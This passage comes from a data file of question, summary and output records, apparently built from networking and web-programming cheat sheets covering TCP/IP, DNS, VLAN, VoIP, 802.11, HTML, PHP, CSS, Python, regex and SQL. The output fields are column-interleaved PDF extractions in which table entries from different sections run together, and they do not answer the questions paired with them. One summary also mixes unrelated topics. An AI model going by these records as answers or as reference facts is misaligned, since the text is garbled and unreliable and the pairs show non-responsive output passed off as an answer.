Administratively Prohibited value = 5 (20 bytes) & maximum value = 15 (60 bytes) 22 ssh 143 imap\n10 Host Administratively Prohibited\n11 Network Unreachable for TOS Type of Service (PreDTRCx) --> Differentiated Services 23 telnet 179 bgp\nDNS Parameters 12 Host Unreachable for TOS Precedence (000-111) 000 25 smtp 389 ldap\n13 Communication Administratively Prohibited D (1 = minimize delay) 0 53 domain 443 https (ssl)\nQuery/Response 4 Source Quench T (1 = maximize throughout) 0 79 finger 445 microsoft-ds\n0 Query 5 Redirect R (1 = maximize reliability) 0 80 http 1080 socks\n1 Response 0 Redirect Datagram for the Network C (1 = minimize cost) 1 = ECN capable Offset\nx (reserved and set to 0) 1 = congestion experienced\nOpcode 1 Redirect Datagram for the Host Number of 32-bit words in TCP header; minimum value = 5\n0 Standard query (QUERY) 2 Redirect Datagram for the TOS & Network Total Length\n1 Inverse query (IQUERY) 3 Redirect Datagram for the TOS & Host Number of bytes in packet; maximum length = 65,535 Reserved\n8 Echo 4 bits; set to 0\n2 Server status request (STATUS) Flags (xDM)\n9 Router Advertisement\nx (reserved and set to 0)\nAA 10 Router Selection Flags (CEUAPRSF)\nD (1 = Don't Fragment)\n(1 = Authoritative Answer) 11 Time Exceeded M (1 = More Fragments) ECN bits (used when ECN employed; else 00)\nTC 0 Time to Live exceeded in Transit CWR (1 = sender has cut congestion window in half)\n(1 = TrunCation) 1 Fragment Reassembly Time Exceeded Fragment Offset ECN-Echo (1 = receiver cuts congestion window in half)\n12 Parameter Problem Position of this fragment in the original datagram,\nRD 0 Pointer indicates the error in units of 8 bytes U (1 = Consult urgent pointer, notify server application\n(1 = Recursion Desired) of urgent data)\n1 Missing a Required Option Protocol A (1 = Consult acknowledgement field)\nRA 2 Bad Length 1 ICMP 17 UDP 57 SKIP P (1 = Push data)\n(1 = Recursion Available) 13 Timestamp 2 IGMP 47 GRE 88 EIGRP R (1 = Reset connection)\nZ 14 Timestamp Reply 6 TCP 50 ESP 89 OSPF S (1 = Synchronize sequence numbers)\n(Reserved; set to 0) 15 Information Request 9 IGRP 51 AH 115 L2TP F (1 = no more data; Finish connection)\n16 Information Reply\nResponse code 17 Address Mask Request Header Checksum Checksum\n0 No error 18 Address Mask Reply Covers IP header only Covers pseudoheader and entire TCP segment\n1 Format error 30 Traceroute Addressing\n2 Server failure NET_ID RFC 1918 PRIVATE ADDRESSES Urgent Pointer\n3 Non-existant domain (NXDOMAIN) 0-127 Class A 10.0.0.0-10.255.255.255 Offset pointer to urgent data\n4 Query type not implemented PING (Echo/Echo Reply) 128-191 Class B 172.16.0.0-172.31.255.255\n5 Query refused 192-223 Class C 192.168.0.0-192.168.255.255 Options\nBit Number 224-239 Class D (multicast) 0 End of Options list 3 Window scale\n\nQDCOUNT\n240-255 Class E (experimental) 1 No operation (pad) 4 Selective ACK ok\n(No. of entries in Question section) 1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3\nHOST_ID 2 Maximum segment size 8 Timestamp\n\nANCOUNT\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 0 Network value; broadcast (old)\n(No. of resource records in Answer section)\n255 Broadcast\nNSCOUNT Type (8 or 0) Code (0) Checksum\nOptions (0-40 bytes; padded to 4-byte boundary)\n(No. of name server resource records in Authority section)\nIdentifier Sequence Number 0 End of Options list 68 Timestamp\nARCOUNT 1 No operation (pad) 131 Loose source route\n(No. of resource records in Additional Information section. Data... 7 Record route 137 Strict source route\n\nVLAN\nS\npacketlife.net\nTrunk Encapsulation Trunk Types\n26 6 6 2 4 802.1Q ISL\nISL Dest Source Header Size 4 bytes 26 bytes\nISL Type FCS\nHeader MAC MAC\nTrailer Size N/A 4 bytes\nDest Source Standard IEEE Cisco\nUntagged Type\n\nMAC MAC\nMaximum VLANs 4094 1000\nDest Source\n\n802.1Q 802.1Q Type\nMAC MAC VLAN Numbers\n6 6 4 2 0 Reserved 1004 fdnet\nVLAN Creation 1 default 1005 trnet\n1002 fddi-default 1006-4094 Extended\nSwitch(config)# vlan 100\nSwitch(config-vlan)# name Engineering 1003 tr 4095 Reserved\nAccess Port Configuration Terminology\nTrunking\nSwitch(config-if)# switchport mode access\nSwitch(config-if)# switchport nonegotiate Carrying multiple VLANs over the same\nSwitch(config-if)# switchport access vlan 100 physical connection\nSwitch(config-if)# switchport voice vlan 150\nNative VLAN\nBy default, frames in this VLAN are untagged\nTrunk Port Configuration\nwhen sent across a trunk\nSwitch(config-if)# switchport mode trunk Access VLAN\nSwitch(config-if)# switchport trunk encapsulation dot1q The VLAN to which an access port is assigned\nSwitch(config-if)# switchport trunk allowed vlan 10,20-30\nVoice VLAN\nSwitch(config-if)# switchport trunk native vlan 10\nIf configured, enables minimal trunking to\nSVI Configuration support voice traffic in addition to data traffic\non an access port\nSwitch(config)# interface vlan100\nDynamic Trunking Protocol (DTP)\nSwitch(config-if)# ip address 192.168.100.1 255.255.255.0\nCan be used to automatically establish trunks\nbetween capable ports (insecure)\nVLAN Trunking Protocol (VTP)\nSwitched Virtual Interface (SVI)\nDomain\nA virtual interface which provides a routed\nCommon to all switches participating in VTP\ngateway into and out of a VLAN\nServer Mode\nGenerates and propagates VTP advertisements to clients; Switch Port Modes\ndefault mode on unconfigured switches\ntrunk\nClient Mode Forms an unconditional trunk\nReceives and forwards advertisements from servers; VLANs\ndynamic desirable\ncannot be manually configured on switches in client mode\nAttempts to negotiate a trunk with the far end\nTransparent Mode\ndynamic auto\nForwards advertisements but does not participate in VTP;\nForms a trunk only if requested by the far end\nVLANs must be configured manually\naccess\nPruning Will never form a trunk\nVLANs not having any access ports on an end switch are\nremoved from the trunk to reduce flooded traffic Troubleshooting\nshow vlan\nVTP Configuration\nshow interface [status | switchport]\nSwitch(config)# vtp mode {server | client | transparent}\nSwitch(config)# vtp domain <name> show interface trunk\nSwitch(config)# vtp password <passsword>\nshow vtp status\nSwitch(config)# vtp version {1 | 2}\nSwitch(config)# vtp pruning show vtp password\nby Jeremy Stretch v2.0\n\nVOIP B\n\nASICS\npacketlife.net\nPulse Code Modulation (PCM) Power Over Ethernet (PoE)\n14 13.6 13.5 14 14 Cisco Inline Power (ILP)\n12 12.4 12 12 Pre-standard; employs a 340 kHz tone\n\n12.3\n10 9.2 10 10 to detect devices; power needs\n8 9.1 8 8\ncommunicated via CDP\n6 6.0 5.9 6 6\n4 4 4 IEEE 802.3af\n\n2.8 2.7\n2 2 2"
  },
  {
    "input": "What is the process for calculating the required bandwidth for a G.711/Ethernet call on an access switch port?",
    "summary": "The text describes a system that detects power requirements for PoE devices using line resistance and samples 8000 discrete signal measurements every second. It also outlines various voice codecs and their bandwidth requirements, along with protocols like LLDP, CDP, and DHCP used for device communication and configuration. The system includes features such as VLAN configuration, IP assignment, and registration with a call server, all while managing bandwidth efficiently through compression and QoS settings.",
    "output": "0.9 1.0 Detects power requirements of PoE\n0 0 0\ndevice by the line resistance present\nSampling Quantization Encoding\nIEEE 802.3at\nSampling\nUses LLDP to negotiate delivery of up\n8000 discrete signal measurements are taken at equal intervals every second\nto 25 watts in .10 W intervals\nQuantization\nThe level of each sample is rounded to the nearest expressible value IEEE 802.3af Classes\nEncoding 0 15.4 W 3 15.4 W\nDigital values are encoded as binary numbers for encapsulation\n1 4 W 4 Reserved\nCompression (Optional)\nThe digital signal is compressed in real time to consume less bandwidth 2 7 W\nVoice Codecs IP Phone Boot Process\nMOS Bandwidth Complexity Free\n3\nG.722 SB-ADPCM 4.13 48-64 kbps Medium Yes\nG.711 PCM 4.1 64 kbps Low Yes\niLBC 4.1 15.2 kbps High Yes 2\n5\nG.729 CS-ACELP 3.92 8 kbps High No 1 4\nG.726 ADPCM 3.85 32 kbps Medium Yes\nG.729a CS-ACELP 3.7 8 kbps Medium No TFTP Server Call Server\nG.728 LD-CELP 3.61 16 kbps High No\n1. Power Over Ethernet (Optional)\nPower is supplied via IEEE 802.3af/at or Cisco ILP\nSignaling Protocols\n2. VLANs Learned via CDP or LLDP\nITU-T H.323 Voice and data VLANs communicated via CDP/LLDP\nOriginally designed for multimedia transmission over ISDN; mature\n3. IP Assignment via DHCP\nand widely supported; peer-to-peer call control\nThe phone sends a DHCP request in the voice VLAN;\nSession Initiation Protocol (SIP) the response includes an IP and DHCP option 150\nText-based, similar in nature to HTTP; defined in RFC 3261; peer-\n4. Configuration Retrieved via TFTP\nto-peer call control\nThe phone retrieves its configuration from one of the\nMedia Gateway Control Protocol (MGCP) TFTP servers specified in the DHCP option\nEmploys centralized call control; defined in RFC 3661\n5. Registration\nSkinny Client Control Protocol (SCCP)\nThe phone registers with the call server(s) specified\nCisco-proprietary; limited support on gateways; centralized control in its configuration\nCalculating Required Bandwidth\nAccess Switch Port Configuration\nG.711/Ethernet Example\ninterface FastEthernet0/1\nCodec Payload\n64 Kbps × 20 msec 160 B\n(Bitrate × Sample Size) ! Configure data and voice access VLANs\nswitchport access vlan <VLAN>\nL2 Overhead Ethernet (18) + 802.1Q (4) + 22 B\nswitchport voice vlan <VLAN>\nL3 Overhead IP (20) + 20 B\n! Trust ingress QoS markings\nL4 Overhead UDP (8) + RTP (12) + 20 B\nmls qos trust cos\nPackets per Second 1000 msec / 20 msec ×50 pps\n! Optionally pre-allocate power for the port\nTotal Bandwidth 88.8 Kbps power inline static [max <wattage>]\nby Jeremy Stretch v1.0\nIEEE 802.11 WLAN · P 1\nART\npacketlife.net\nIEEE Standards"
  },
  {
    "input": "What are the key differences between the various IEEE 802.11 standards (802.11a, 802.11b, 802.11g, 802.11n) in terms of maximum throughput, frequency, modulation schemes, and WLAN types?",
    "summary": "The text explains the differences between various IEEE 802.11 wireless LAN standards, including their maximum throughput, frequency, modulation schemes, and encryption methods. It also covers WLAN components like BSS, ESS, and DCF, as well as QoS and security protocols such as WEP, WPA, and WPA2. Additionally, it provides information on HTML and CSS elements, syntax, and attributes used in web development.",
    "output": "802.11a 802.11b 802.11g 802.11n\nMaximum Throughput 54 Mbps 11 Mbps 54 Mbps 300 Mbps\nFrequency 5 GHz 2.4 GHz 2.4 GHz 2.4/5 GHz\nModulation OFDM DSSS DSSS/OFDM OFDM\nChannels (FCC/ETSI) 21/19 11/13 11/13 32/32\nRatified 1999 1999 2003 2009\nWLAN Types WLAN Components\nAd Hoc\nESS\nA WLAN between isolated stations with IBSS BSS BSS\nno central point of control; an IBSS\nInfrastructure\nA WLAN attached to a wired network via\nan access point; a BSS or ESS\nDS\nFrame Types\nType Class\nAssociation Management\nAuthentication Management Basic Service Area (BSA)\nThe physical area covered by the wireless signal of a BSS\nProbe Management\nBasic Service Set (BSS)\nBeacon Management A set of stations and/or access points which can directly\ncommunicate via a wireless medium\nRequest to Send (RTS) Control\nDistribution System (DS)\nClear to Send (CTS) Control\nThe wired infrastructure connecting multiple BSSs to form an ESS\nAcknowledgment (ACK) Control\nExtended Service Set (ESS)\nData Data A set of multiple BSSs connected by a DS which appear to wireless\nstations as a single BSS\nClient Association Independent BSS (IBSS)\nAn isolated BSS with no connection to a DS; an ad hoc WLAN\nMeasuring RF Signal Strength\nProbe Request\nDecibel (dB)\nProbe Response\nAn expression of signal strength as compared to a reference signal;\nAuthentication Request calculated as 10log (signal/reference)\n10\nAuthentication Response\ndBm · Signal strength compared to a 1 milliwatt signal\nAssociation Request\ndBw · Signal strength compared to a 1 watt signal\nAssociation Response\ndBi · Compares forward antenna gain to that of an isotropic antenna\nModulations\nTerminology\nScheme Modulation Throughput\nDBPSK 1 Mbps Basic Service Set Identifier (BSSID)\nA MAC address which serves to uniquely identify a BSS\nDSSS DQPSK 2 Mbps\nService Set Identifier (SSID)\nCCK 5.5/11 Mbps\nA human-friendly text string which identifies a BSS; 1-32 characters\nBPSK 6/9 Mbps\nCarrier Sense Multiple Access/Collision Avoidance (CSMA/CA)\nQPSK 12/18 Mbps The mechanism which facilitates efficient communication across a\nOFDM shared wireless medium (provided by DCF or PCF)\n16-QAM 24/36 Mbps\nEffective Isotropic Radiated Power (EIRP)\n64-QAM 48/54 Mbps Net signal strength (transmitter power + antenna gain - cable loss)\nby Jeremy Stretch v2.2\nIEEE 802.11 WLAN · P 2\nART\npacketlife.net\nDistributed Coordination Function (DCF)\n\nDIFS DIFS DIFS DIFS\nA Frame\nB Deferral Period\nC Random Backoff\nContention Window\nD\nInterframe Spacing Client Authentication\nShort IFS (SIFS) Open · No authentication is used\nUsed to provide minimal spacing delay between\nPre-shared Encryption Keys\ncontrol frames or data fragments\nKeys are manually distributed among clients and APs\nDCF IFS (DIFS)\nLightweight EAP (LEAP)\nNormal spacing enforced under DCF for management\nCisco-proprietary EAP method introduced to provide\nand non-fragment data frames\ndynamic keying for WEP (deprecated)\nArbitrated IFS (AIFS)\n\nEAP-TLS\nVariable spacing calculated to accommodate differing\nEmploys Transport Layer Security (TLS); PKI\nqualities of service (QoS)\ncertificates are required on the AP and clients\nExtended IFS (EIFS)\n\nEAP-TTLS\nExtended delay imposed after errors are detected in a\nClients authenticate the AP via PKI, then form a secure\nreceived frame\ntunnel inside which the client authentication takes\nplace (clients do not need PKI certificates)\nEncryption Schemes\nProtected EAP (PEAP)\nWired Equivalent Privacy (WEP)\nA proposal by Cisco, Microsoft, and RSA which employs\nFlawed RC4 implementation using a 40- or 104-bit\na secure tunnel for client authentication like EAP-TTLS\npre-shared encryption key (deprecated)\n\nEAP-FAST\nWi-Fi Protected Access (WPA)\nDeveloped by Cisco to replace LEAP; establishes a\nImplements the improved RC4-based encryption\nsecure tunnel using a Protected Access Credential\nTemporal Key Integrity Protocol (TKIP) which can\n(PAC) in the absence of PKI certificates\noperate on WEP-capable hardware\nIEEE 802.11i (WPA2) RF Signal Interference\nIEEE standard developed to replace WPA; requires a\nReflection Scattering Absorption\nnew generation of hardware to implement significantly\nstronger AES-based CCMP encryption\nQuality of Service Markings\nWMM 802.11e 802.1p\nPlatinum 7/6 6/5\nRefraction Diffraction\nGold 5/4 4/3\nSilver 3/0 0\nBronze 2/1 2/1\nWi-Fi Multimedia (WMM)\nA Wi-Fi Alliance certification for QoS; a subset of Antenna Types\n\n802.11e QoS\nDirectional · Radiates power in one focused direction\nIEEE 802.11e\nOmnidirectional\nOfficial IEEE WLAN QoS standard ratified in 2005;\nRadiates power uniformly across a plane\nreplaces WMM\nIsotropic\nIEEE 802.1p\nA theoretical antenna referenced when measuring\nQoS markings in the 802.1Q header on wired Ethernet\neffective radiated power\nby Jeremy Stretch v2.2\nDocument Outline Lists Objects\n<!DOCTYPE> Version of (X)HTML <ol> Ordered list <object> Object\n<html> HTML document <ul> Unordered list <param /> Parameter\n<head> Page information <li> List item\n<body> Page contents <dl> Definition list\nEmpty Elements\n<dt> Definition term\n<dd> Term description <area /> <img />\nComments\n<base /> <input />\n<!-- Comment Text --> Forms <br /> <link />\n<col /> <meta />\nPage Information <form> Form <hr /> <param />\n<fieldset> Collection of fields\n<base /> Base URL <legend> Form legend Core Attributes\n<meta /> Meta data <label> Input label\n<title> Title <input /> Form input class style\n<link /> Relevant resource <select> Drop-down box id title\n<style> Style resource <optgroup> Group of options Note: Core Attributes may not be used\n<script> Script resource <option> Drop-down options in base, head, html, meta, param,\n<textarea> Large text input script, style or title elements. <button> Button\nDocument Structure\nLanguage Attributes\n<h[1-6]> Heading\nTables\n<div> Page section dir lang\n<span> Inline section <table> Table\nNote: Language Attributes may not be\n<p> Paragraph <caption> Caption\nused in base, br, frame, frameset, hr,\n<br /> Line break <thead> Table header\niframe, param or script elements. <hr /> Horizontal rule <tbody> Table body\n<tfoot> Table footer\nKeyboard Attributes\nLinks <colgroup> Column group\n<col /> Column\n<a href=\"\"> Page link <tr> Table row accesskey tabindex\n<a href=\"mailto:\"> Email link <th> Header cell\n<a name=\"name\"> Anchor <td> Table cell Window Events\n<a href=\"#name\"> Link to anchor\nonLoad onUnload\nImages and Image Maps\nText Markup\n<img /> Image Form Events\n<strong> Strong emphasis\n<map> Image Map\n<em> Emphasis <area /> Area of Image Map onBlur onReset\n<blockquote> Long quotation onChange onSelect\n<q> Short quotation onFocus onSubmit\nCommon Character Entities\n<abbr> Abbreviation\n<acronym> Acronym\n&#34; \" Quotation mark Keyboard Events\n<address> Address\n&#38; & Ampersand\n<pre> Pre-formatted text\n&#60; < Less than onKeydown onKeyup\n<dfn> Definition\n&#62; > Greater than onKeypress\n<code> Code\n&#64; @ \"At\" symbol\n<cite> Citation\n&#128; € Euro Mouse Events\n<del> Deleted text\n&#149; • Small bullet\n<ins> Inserted text\n&#153; ™ Trademark onClick onMouseout\n<sub> Subscript\n&#163; £ Pound onDblclick onMouseover\n<sup> Superscript\n&#160; Non-breaking space onMousedown onMouseup\n<bdo> Text direction\n&#169; © Copyright symbol onMousemove\nAvailable free from AddedBytes.com\nArray Functions Regular Expression Functions Date Formatting\narray_diff (arr1, arr2 ...) ereg (pattern, str) Y 4 digit year (2008)\narray_filter (arr, function) split (pattern, str) y 2 digit year (08)\narray_flip (arr) ereg_replace (pattern, replace, str) F Long month (January)\narray_intersect (arr1, arr2 ...) preg_grep (pattern, arr) M Short month (Jan)\narray_merge (arr1, arr2 ...) preg_match (pattern, str) m Month 4 (01 to 12)\narray_pop (arr) preg_match_all (pattern, str, arr) n Month (1 to 12)\narray_push (arr, var1, var2 ...) preg_replace (pattern, replace, str) D Short day name (Mon)\narray_reverse (arr) preg_split (pattern, str) l Long day name (Monday) (lowercase L)\narray_search (needle, arr) d Day 4 (01 to 31)\narray_walk (arr, function) j Day (1 to 31)\nRegular Expressions Syntax\ncount (count)\nin_array (needle, haystack) ^ Start of string h 12 Hour 4 (01 to 12)\n$ End of string g 12 Hour (1 to 12)\n. Any single character H 24 Hour 4 (00 to 23)\nString Functions\n(a|b) a or b G 24 Hour (0 to 23)\ncrypt (str, salt) (...) Group section i Minutes 4 (00 to 59)\nexplode (sep, str) [abc] Item in range (a, b or c) s Seconds 4 (00 to 59)\nimplode (glue, arr) [^abc] Not in range (not a, b or c)\nnl2br (str) \\s White space w Day of week 1 (0 to 6)\nsprintf (frmt, args) a? Zero or one of a z Day of year (0 to 365)\nstrip_tags (str, allowed_tags) a* Zero or more of a W Week of year 2 (1 to 53)\nstr_replace (search, replace, str) a*? Zero or more of a, ungreedy t Days in month (28 to 31)\nstrpos (str, needle) a+ One or more of a\nstrrev (str) a+? One or more of a, ungreedy a am or pm\nstrstr (str, needle) a{3} Exactly 3 of a A AM or PM\nstrtolower (str) a{3,} 3 or more of a B Swatch Internet Time (000 to 999)\nstrtoupper (str) a{,6} Up to 6 of a S Ordinal Suffix (st, nd, rd, th)\nsubstr (string, start, len) a{3,6} 3 to 6 of a\na{3,6}? 3 to 6 of a, ungreedy T Timezone of machine (GMT)\n\\ Escape character Z Timezone offset (seconds)\nFilesystem Functions\n[:punct:] Any punctuation symbol O Difference to GMT (hours) (e.g., +0200)\nclearstatcache () [:space:] Any space character I Daylight saving (1 or 0)\ncopy (source, dest) [:blank:] Space or tab L Leap year (1 or 0)\nfclose (handle)\nfgets (handle, len) U Seconds since Epoch 3\nPCRE Modifiers\nfile (file) c ISO 8601 (PHP 5)\nfilemtime (file) i Case-insensitive 2008-07-31T18:30:13+01:00\nfilesize (file) s Period matches newline r RFC 2822\nfile_exists (file) m ^ and $ match lines Thu, 31 Jul 2008 18:30:13 +0100\nfopen (file, mode) U Ungreedy matching\nfread (handle, len) e Evaluate replacement 1. 0 is Sunday, 6 is Saturday. fwrite (handle, str) x Pattern over several lines\nreadfile (file) 2. Week that overlaps two years belongs\nto year that contains most days of that\nDate and Time Functions\nweek. Hence week number for 1st\nfopen() Modes\ncheckdate (month, day, year) January of a given year can be 53 if\nr Read date (format, timestamp) week belongs to previous year. r+ Read and write, prepend getdate (timestamp) date(\"W\", mktime(0, 0, 0, 12, 8,\nw Write, truncate mktime (hr, min, sec, month, day, yr) $year)) always gives correct number of\nw+ Read and write, truncate strftime (formatstring, timestamp) weeks in $year. a Write, append strtotime (str)\na+ Read and write, append time () 3. The Epoch is the 1st January 1970. 4. With leading zeroes\nAvailable free from AddedBytes.com\nccssss\nSelectors Box Model Boxes\n* All elements margin x border-color x\nVisible Area Margin\ndiv <div> margin-top border-top-color\ndiv * All elements within <div> margin-right border-right-color\ndiv span <span> within <div> margin-bottom border-bottom-color\ndiv, span <div> and <span> margin-left border-left-color\ndiv > span <span> with parent <div> padding x border-style x\ndiv + span <span> preceded by <div> padding-top border-top-style\n.class Elements of class \"class\" padding-right border-right-style\ndiv.class <div> of class \"class\" padding-bottom border-bottom-style\n#itemid Element with id \"itemid\" padding-left border-left-style\ndiv#itemid <div> with id \"itemid\" border x border-width x\na[attr] <a> with attribute \"attr\" border-top x border-top-width\na[attr='x'] <a> when \"attr\" is \"x\" Height Border Width Padding border-bottom x border-right-width\na[class~='x'] <a> when class is a list border-right x border-bottom-width\ncontaining 'x' border-left x border-left-width\nPositioning\na[lang|='en'] <a> when lang begins \"en\"\ndisplay clear\nTables\nposition z-index\nPseudo-Selectors and Pseudo-Classes\ntop direction + caption-side + border-spacing +\n:first-child First child element right unicode-bidi table-layout empty-cells +\n:first-line First line of element bottom overflow border-collapse + speak-header +\n:first-letter First letter of element left clip\n:hover Element with mouse over float visibility\nPaging\n:active Active element\n:focus Element with focus size page-break-inside +\nDimensions\n:link Unvisited links marks page +\n:visited Visited links width min-height page-break-before orphans +\n:lang(var) Element with language \"var\" min-width max-height page-break-after widows +\n:before Before element max-width vertical-align\n:after After element height\nInterface\ncursor + outline-style\nSizes and Colours Color / Background\noutline x outline-color\n0 0 requires no unit color + background-repeat outline-width\nRelative Sizes background x background-image\nem 1em equal to font size of background-color background-position\nAural\nparent (same as 100%) background-attachment\nex Height of lower case \"x\" volume + elevation\n% Percentage speak + speech-rate\nText\nAbsolute Sizes pause x voice-family\npx Pixels text-indent + word-spacing + pause-before pitch\nText\ncm Centimeters text-align + text-transform + pause-after pitch-range\nmm Millimeters text-decoration white-space + cue x stress\nin Inches text-shadow line-height + cue-before richness\npt 1pt = 1/72in letter-spacing + cue-after speak-punctuation\npc 1pc = 12pt play-during speak-numeral\nColours azimuth +\nFonts\n#789abc RGB Hex Notation\n#acf Equates to \"#aaccff\" font + x font-weight +\nMiscellaneous\nrgb(0,25,50) Value of each of red, green, font-family + font-stretch +\nand blue. 0 to 255, may be font-style + font-size + content list-style-type +\nswapped for percentages."
  },
  {
    "input": "What are the key topics and concepts covered in the provided text about Python, regular expressions, and SQL?",
    "summary": "The text provides information on various Python string and date methods, including formatting options like strftime and strptime, as well as regular expression patterns and functions. It also lists string methods such as capitalize(), lstrip(), and replace(), along with date functions like today() and now(). Additionally, it covers creating stored procedures, triggers, views, and indexes in SQL, along with mathematical functions like ABS and LOG10.",
    "output": "font-variant + font-size-adjust + quotes + list-style-image +\ncounter-reset list-style-position +\nShorthand properties are marked x Available free from counter-increment marker-offset\nNote\nProperties that inherit are marked + www.AddedBytes.com list-style + x\nsys Variables String Methods Datetime Methods\nargv Command line args capitalize() * lstrip() today() fromordinal(ordinal)\nbuiltin_module_names Linked C modules center(width) partition(sep) now(timezoneinfo) combine(date, time)\nbyteorder Native byte order count(sub, start, end) replace(old, new) utcnow() strptime(date, format)\ncheck_interval Signal check frequency decode() rfind(sub, start ,end) fromtimestamp(timestamp)\nexec_prefix Root directory encode() rindex(sub, start, end) utcfromtimestamp(timestamp)\nexecutable Name of executable endswith(sub) rjust(width)\nexitfunc Exit function name expandtabs() rpartition(sep)\nTime Methods\nmodules Loaded modules find(sub, start, end) rsplit(sep)\npath Search path index(sub, start, end) rstrip() replace() utcoffset()\nplatform Current platform isalnum() * split(sep) isoformat() dst()\nstdin, stdout, stderr File objects for I/O isalpha() * splitlines() __str__() tzname()\nversion_info Python version info isdigit() * startswith(sub) strftime(format)\nwinver Version number islower() * strip()\nisspace() * swapcase() *\nDate Formatting (strftime and strptime)\nistitle() * title() *\nsys.argv for $ python foo.py bar -c qux --h\nisupper() * translate(table) %a Abbreviated weekday (Sun)\nsys.argv[0] foo.py join() upper() * %A Weekday (Sunday)\nsys.argv[1] bar ljust(width) zfill(width) %b Abbreviated month name (Jan)\nsys.argv[2] -c lower() * %B Month name (January)\nsys.argv[3] qux %c Date and time\nsys.argv[4] --h Methods marked * are locale %d Day (leading zeros) (01 to 31)\nNote\ndependant for 8-bit strings. %H 24 hour (leading zeros) (00 to 23)\n%I 12 hour (leading zeros) (01 to 12)\nos Variables\n%j Day of year (001 to 366)\nList Methods\naltsep Alternative sep %m Month (01 to 12)\ncurdir Current dir string append(item) pop(position) %M Minute (00 to 59)\ndefpath Default search path count(item) remove(item) %p AM or PM\ndevnull Path of null device extend(list) reverse() %S Second (00 to 61 4)\nextsep Extension separator index(item) sort() %U Week number 1 (00 to 53)\nlinesep Line separator insert(position, item) %w Weekday 2 (0 to 6)\nname Name of OS %W Week number 3 (00 to 53)\npardir Parent dir string %x Date\nFile Methods\npathsep Patch separator %X Time\nsep Path separator close() readlines(size) %y Year without century (00 to 99)\nflush() seek(offset) %Y Year (2008)\nRegistered OS names: “posix”, “nt”, fileno() tell() %Z Time zone (GMT)\nNote\n“mac”, “os2”, “ce”, “java”, “riscos” isatty() truncate(size) %% A literal \"%\" character (%)\nnext() write(string)\nread(size) writelines(list) 1. Sunday as start of week. All days in a\nClass Special Methods\nreadline(size) new year preceding the first Sunday\n__new__(cls) __lt__(self, other) are considered to be in week 0. __init__(self, args) __le__(self, other)\nIndexes and Slices (of a=[0,1,2,3,4,5])\n__del__(self) __gt__(self, other) 2. 0 is Sunday, 6 is Saturday. __repr__(self) __ge__(self, other) len(a) 6\n__str__(self) __eq__(self, other) a[0] 0 3. Monday as start of week. All days in a\n__cmp__(self, other) __ne__(self, other) a[5] 5 new year preceding the first Monday\n__index__(self) __nonzero__(self) a[-1] 5 are considered to be in week 0. __hash__(self) a[-2] 4\n__getattr__(self, name) a[1:] [1,2,3,4,5] 4. This is not a mistake. Range takes\n__getattribute__(self, name) a[:5] [0,1,2,3,4] account of leap and double-leap\n__setattr__(self, name, attr) a[:-2] [0,1,2,3] seconds. __delattr__(self, name) a[1:3] [1,2]\n__call__(self, args, kwargs) a[1:-1] [1,2,3,4]\nAvailable free from AddedBytes.com\nb=a[:] Shallow copy of a\nAnchors Sample Patterns\n^ Start of line + ([A-Za-z0-9-]+) Letters, numbers and hyphens\n\\A Start of string + (\\d{1,2}\\/\\d{1,2}\\/\\d{4}) Date (e.g. 21/3/2006)\n$ End of line + ([^\\s]+(?=\\.(jpg|gif|png))\\.\\2) jpg, gif or png image\n\\Z End of string + (^[1-9]{1}$|^[1-4]{1}[0-9]{1}$|^50$) Any number from 1 to 50 inclusive\n\\b Word boundary + (#?([A-Fa-f0-9]){3}(([A-Fa-f0-9]){3})?) Valid hexadecimal colour code\n\\B Not word boundary + ((?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,15}) 8 to 15 character string with at least one\n\\< Start of word upper case letter, one lower case letter,\n\\> End of word and one digit (useful for passwords). (\\w+@[a-zA-Z_]+?\\.[a-zA-Z]{2,6}) Email addresses\n(\\<(/?[^\\>]+)\\>) HTML Tags\nCharacter Classes\n\\c Control character These patterns are intended for reference purposes and have not been extensively tested. Note\n\\s White space Please use with caution and test thoroughly before use. \\S Not white space\n\\d Digit\nQuantifiers Ranges\n\\D Not digit\n\\w Word * 0 or more + . Any character except\n\\W Not word *? 0 or more, ungreedy + new line (\\n) +\n\\xhh Hexadecimal character hh + 1 or more + (a|b) a or b +\n\\Oxxx Octal character xxx +? 1 or more, ungreedy + (...) Group +\n? 0 or 1 + (?:...) Passive Group +\n?? 0 or 1, ungreedy + [abc] Range (a or b or c) +\nPOSIX Character Classes\n{3} Exactly 3 + [^abc] Not a or b or c +\n[:upper:] Upper case letters {3,} 3 or more + [a-q] Letter between a and q +\n[:lower:] Lower case letters {3,5} 3, 4 or 5 + [A-Q] Upper case letter +\n[:alpha:] All letters {3,5}? 3, 4 or 5, ungreedy + between A and Q +\n[:alnum:] Digits and letters [0-7] Digit between 0 and 7 +\n[:digit:] Digits \\n nth group/subpattern +\nSpecial Characters\n[:xdigit:] Hexadecimal digits\n[:punct:] Punctuation \\ Escape Character +\nNote Ranges are inclusive. [:blank:] Space and tab \\n New line +\n[:space:] Blank characters \\r Carriage return +\n[:cntrl:] Control characters \\t Tab +\nPattern Modifiers\n[:graph:] Printed characters \\v Vertical tab +\n[:print:] Printed characters and \\f Form feed + g Global match\nspaces \\a Alarm i Case-insensitive\n[:word:] Digits, letters and [\\b] Backspace m Multiple lines\nunderscore \\e Escape s Treat string as single line\n\\N{name} Named Character x Allow comments and\nwhite space in pattern\nAssertions\ne Evaluate replacement\nString Replacement (Backreferences)\n?= Lookahead assertion + U Ungreedy pattern\n?! Negative lookahead + $n nth non-passive group\n?<= Lookbehind assertion + $2 \"xyz\" in /^(abc(xyz))$/\nMetacharacters (must be escaped)\n?!= or ?<! Negative lookbehind + $1 \"xyz\" in /^(?:abc)(xyz)$/\n?> Once-only Subexpression $` Before matched string ^ [ . ?() Condition [if then] $' After matched string $ { *\n?()| Condition [if then else] $+ Last matched string ( \\ +\n?# Comment $& Entire matched string ) | ? $_ Entire input string < >\nItems marked + should work in most $$ Literal \"$\"\nNote\nregular expression implementations. Available free from\nAddedBytes.com\nString Functions Date Functions Create a Stored Procedure\nExact Numerics DATEADD (datepart, number, date) CREATE PROCEDURE name\nbit decimal DATEDIFF (datepart, start, end) @variable AS datatype = value\ntinyint money DATENAME (datepart, date) AS\nsmallint numeric DATEPART (datepart, date) -- Comments\nbigint DAY (date) SELECT * FROM table\nApproximate Numerics GETDATE() GO\nfloat real GETUTCDATE()\nDate and Time MONTH (date) Create a Trigger\nsmalldatetime timestamp YEAR 